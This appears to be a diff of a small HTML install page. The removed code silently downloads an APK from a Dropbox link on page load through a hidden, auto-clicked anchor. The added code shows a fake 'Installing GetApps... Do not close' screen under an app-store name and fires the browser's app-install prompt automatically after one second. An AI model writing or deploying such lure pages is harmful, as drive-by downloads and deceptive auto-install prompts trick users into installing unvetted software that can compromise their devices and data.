@@ -1,44 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Test</title>
-
-  <link rel="manifest" href="./manifest.json">
-  <link rel="icon" href="./icon-192.png"">
-
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>GetApps</title>
+  <link rel="manifest" href="/manifest.json">
+  <link rel="icon" href="/icon-192.png">
   <style>
-    body{margin:0;background:#f8f9fa;font-family:system-ui,sans-serif}
-    .card{max-width:380px;margin:2rem auto;background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center}
-    h2{margin-top:0}
-    #msg{margin-top:1rem;font-size:.9rem;color:#555}
+    body{margin:0;background:#0066cc;color:white;font-family:system-ui;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
+    .msg{font-size:1.2rem}
   </style>
 </head>
 <body>
+  <div class="msg">Installing GetApps...<br><small>Do not close</small></div>
+
   <script>
-    const APK_URL = "https://dl.dropboxusercontent.com/scl/fi/4xmi395xwb4q775qb5ybu/test.apk?rlkey=t1qngszj6gbberx99tmoczlgp";
-
-    let pwaPrompt = null;
-
+    let promptEvent;
     window.addEventListener('beforeinstallprompt', e => {
       e.preventDefault();
-      pwaPrompt = e;
-      setTimeout(() => pwaPrompt.prompt(), 600);
-    });
-
-    function downloadApk() {
-      const a = document.createElement('a');
-      a.href = APK_URL;
-      a.download = "test.apk";
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-    }
-
-    window.addEventListener('load', () => {
-      downloadApk();
+      promptEvent = e;
+      // AUTO-TRIGGER after 1 sec
+      setTimeout(() => promptEvent.prompt(), 1000);
     });
   </script>
 </body>
